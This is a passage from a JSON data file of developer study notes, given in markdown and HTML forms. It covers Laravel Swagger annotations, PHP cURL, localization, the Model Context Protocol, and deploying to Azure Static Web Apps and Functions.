...)]`\n- Auto-gen in dev: `L5_SWAGGER_GENERATE_ALWAYS=true` in `.env`","body_html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOpenAPI\u003c/strong\u003e = specification language (JSON/YAML contract)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSwagger\u003c/strong\u003e = toolset (UI, Editor, Codegen) — not the same as OpenAPI\u003c/li\u003e\n\u003cli\u003ePackage: \u003ccode\u003ecomposer require darkaonline/l5-swagger -W\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ePublish: \u003ccode\u003ephp artisan vendor:publish --provider=&quot;L5Swagger\\L5SwaggerServiceProvider&quot;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eGenerate: \u003ccode\u003ephp artisan l5-swagger:generate\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eDocs URL: \u003ccode\u003e/api/documentation\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eBase annotation: \u003ccode\u003e#[OA\\Info(title:&#39;API&#39;, version:&#39;1.0&#39;)]\u003c/code\u003e on a controller\u003c/li\u003e\n\u003cli\u003eEndpoint: \u003ccode\u003e#[OA\\Get(path:&#39;/api/items&#39;, ...)]\u003c/code\u003e · \u003ccode\u003e#[OA\\Post(...)]\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eResponse: \u003ccode\u003e#[OA\\Response(response:200, description:&#39;OK&#39;)]\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSchema: \u003ccode\u003e#[OA\\Schema(schema:&#39;Item&#39;, required:[&#39;name&#39;], ...)]\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAuto-gen in dev: \u003ccode\u003eL5_SWAGGER_GENERATE_ALWAYS=true\u003c/code\u003e in \u003ccode\u003e.env\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"cURL","body_md":"- 4-step pattern: `curl_init($url)` → `curl_setopt($h, OPT, $val)` → `curl_exec($h)` → `curl_close($h)`\n- `CURLOPT_RETURNTRANSFER` → store response in variable (not output directly)\n- `CURLOPT_HTTPHEADER` → set headers array\n- `CURLOPT_SSL_VERIFYHOST=0` + `CURLOPT_SSL_VERIFYPEER=0` → disable SSL (dev only)\n- Error check: `if ($resp === false) { curl_error($h) }`","body_html":"\u003cul\u003e\n\u003cli\u003e4-step pattern: \u003ccode\u003ecurl_init($url)\u003c/code\u003e → \u003ccode\u003ecurl_setopt($h, OPT, $val)\u003c/code\u003e → \u003ccode\u003ecurl_exec($h)\u003c/code\u003e → \u003ccode\u003ecurl_close($h)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eCURLOPT_RETURNTRANSFER\u003c/code\u003e → store response in variable (not output directly)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eCURLOPT_HTTPHEADER\u003c/code\u003e → set headers array\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eCURLOPT_SSL_VERIFYHOST=0\u003c/code\u003e + \u003ccode\u003eCURLOPT_SSL_VERIFYPEER=0\u003c/code\u003e → disable SSL (dev only)\u003c/li\u003e\n\u003cli\u003eError check: \u003ccode\u003eif ($resp === false) { curl_error($h) }\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Localization","body_md":"- Directory: `resources/lang/{locale}/` (NOT views/lang, storage/lang, app/lang)\n- PHP file: `resources/lang/fr/messages.php` → returns array (domain text)\n- JSON file: `resources/lang/fr.json` → key=English phrase (UI strings)\n- Helper: `__('messages.welcome')` or `__('text')` (NOT `translate()`, `t()`, `i18n()`)\n- Plural: `trans_choice('messages.apples', $count)` with `{0}...|{1}...|[2,*] :count`\n- Set at runtime: `App::setLocale('fr')` · default in `config/app.php`\n- Middleware pattern: `SetLocale` middleware reads session/route param\n- Route prefix: `Route::prefix('{locale}')-\u003emiddleware('setLocale')-\u003egroup(...)`","body_html":"\u003cul\u003e\n\u003cli\u003eDirectory: \u003ccode\u003eresources/lang/{locale}/\u003c/code\u003e (NOT views/lang, storage/lang, app/lang)\u003c/li\u003e\n\u003cli\u003ePHP file: \u003ccode\u003eresources/lang/fr/messages.php\u003c/code\u003e → returns array (domain text)\u003c/li\u003e\n\u003cli\u003eJSON file: \u003ccode\u003eresources/lang/fr.json\u003c/code\u003e → key=English phrase (UI strings)\u003c/li\u003e\n\u003cli\u003eHelper: \u003ccode\u003e__(&#39;messages.welcome&#39;)\u003c/code\u003e or \u003ccode\u003e__(&#39;text&#39;)\u003c/code\u003e (NOT \u003ccode\u003etranslate()\u003c/code\u003e, \u003ccode\u003et()\u003c/code\u003e, \u003ccode\u003ei18n()\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003ePlural: \u003ccode\u003etrans_choice(&#39;messages.apples&#39;, $count)\u003c/code\u003e with \u003ccode\u003e{0}...|{1}...|[2,*] :count\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSet at runtime: \u003ccode\u003eApp::setLocale(&#39;fr&#39;)\u003c/code\u003e · default in \u003ccode\u003econfig/app.php\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eMiddleware pattern: \u003ccode\u003eSetLocale\u003c/code\u003e middleware reads session/route param\u003c/li\u003e\n\u003cli\u003eRoute prefix: \u003ccode\u003eRoute::prefix(&#39;{locale}&#39;)-&gt;middleware(&#39;setLocale&#39;)-&gt;group(...)\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"MCP — Model Context Protocol","body_md":"- Created by: **Anthropic** (not OpenAI, Meta, Google)\n- Three components: **Tools** (executable actions) · **Resources** (data sources) · **Prompts** (reusable LLM templates)\n- Architecture: MCP Client ↔ MCP Server (composable — a client can also be a server)\n- Laravel: `composer require laravel/mcp`\n- Commands: `make:mcp-server Name` · `make:mcp-tool Name` · `mcp:inspector path`\n- Config: `mcp.json` in VS Code with server URL and type `\"http\"`","body_html":"\u003cul\u003e\n\u003cli\u003eCreated by: \u003cstrong\u003eAnthropic\u003c/strong\u003e (not OpenAI, Meta, Google)\u003c/li\u003e\n\u003cli\u003eThree components: \u003cstrong\u003eTools\u003c/strong\u003e (executable actions) · \u003cstrong\u003eResources\u003c/strong\u003e (data sources) · \u003cstrong\u003ePrompts\u003c/strong\u003e (reusable LLM templates)\u003c/li\u003e\n\u003cli\u003eArchitecture: MCP Client ↔ MCP Server (composable — a client can also be a server)\u003c/li\u003e\n\u003cli\u003eLaravel: \u003ccode\u003ecomposer require laravel/mcp\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eCommands: \u003ccode\u003emake:mcp-server Name\u003c/code\u003e · \u003ccode\u003emake:mcp-tool Name\u003c/code\u003e · \u003ccode\u003emcp:inspector path\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eConfig: \u003ccode\u003emcp.json\u003c/code\u003e in VS Code with server URL and type \u003ccode\u003e&quot;http&quot;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Azure Static Web Apps + Functions","body_md":"- SWA = serverless hosting for SPAs (Vue, React, Angular, Svelte) + Functions backend\n- **Triggers**: HTTP · Timer · Queue · Blob · Event Hub\n- **Bindings**: input (read from storage/DB) · output (write to queues/storage)\n- TS function signature: `AzureFunction` type, `Context` + `HttpRequest` params, return via `context.res`\n- Deploy: GitHub Actions auto-generated; set `output_location` + `app_build_command` in `.yml`\n- Common error: wrong `output_location` in build config","body_html":"\u003cul\u003e\n\u003cli\u003eSWA = serverless hosting for SPAs (Vue, React, Angular, Svelte) + Functions backend\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTriggers\u003c/strong\u003e: HTTP · Timer · Queue · Blob · Event Hub\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBindings\u003c/strong\u003e: input (read from storage/DB) · output (write to queues/storage)\u003c/li\u003e\n\u003cli\u003eTS function signature: \u003ccode\u003eAzureFunction\u003c/code\u003e type, \u003ccode\u003eContext\u003c/code\u003e + \u003ccode\u003eHttpRequest\u003c/code\u003e params, return via \u003ccode\u003econtext.res\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eDeploy: GitHub Actions auto-generated; set \u003ccode\u003eoutput_location\u003c/code\u003e + \u003ccode\u003eapp_build_command\u003c/code\u003e in \u003ccode\u003e.yml\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eCommon error: wrong \u003ccode\u003eoutput_location\u003c/code\u003e in build config\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Azure Laravel deployment","body_md":"- `startup.sh`: run migrations (`--force`), copy Nginx config, cache config/routes/views\n- Environment vars: set `DATABASE_CONNECTION_STRING` in Azure portal\n- Pull GitHub Actions `.yml` after Azure creates it; edit build settings; push\n- Production Swagger: add `URL::forceScheme('https')` in `AppServiceProvider`","body_html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003estartup.sh\u003c/code\u003e: run migrations (\u003ccode\u003e--force\u003c/code\u003e), copy Nginx config, cache config/routes/views\u003c/li\u003e\n\u003cli\u003eEnvironment vars: set \u003ccode\u003eDATABASE_CONNECTION_STRING\u003c/code\u003e in Azure portal\u003c/li\u003e\n\u003cli\u003ePull GitHub Actions \u003ccode\u003e.yml\u003c/code\u003e after Azure creates it; edit build settings; push\u003c/li\u003e\n\u003cli\u003eProduction Swagger: add \u003ccode\u003eURL::forceScheme(&#39;https&#39;)\u003c/code\u003e in \u003ccode\u003eAppServiceProvider\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e"}]}};
